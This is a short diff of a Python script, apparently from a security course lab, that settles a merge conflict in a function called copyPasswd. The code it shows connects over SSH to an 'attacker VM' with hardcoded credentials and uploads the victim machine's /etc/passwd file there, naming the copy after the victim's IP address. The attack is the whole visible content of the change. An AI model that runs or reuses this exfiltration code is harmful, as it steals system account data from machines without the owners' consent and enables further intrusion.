@@ -21,15 +21,10 @@ def copyPasswd():
 	
 	sshClient = paramiko.SSHClient()
 	sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	
-	# Hardcoded attacker VM IP-Address. (Change to match your attacker VM IP-Address)
-<<<<<<< HEAD
+
 	sshClient.connect(sys.argv[1], username="cpsc", password="cpsc")
 	
 	print("Sending passwd file to attacker VM.")
-=======
-	sshClient.connect("192.168.1.6", username="cpsc", password="cpsc")
->>>>>>> upstream/master
 	
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("/etc/passwd", "/tmp/passwd_" + getMyIP())
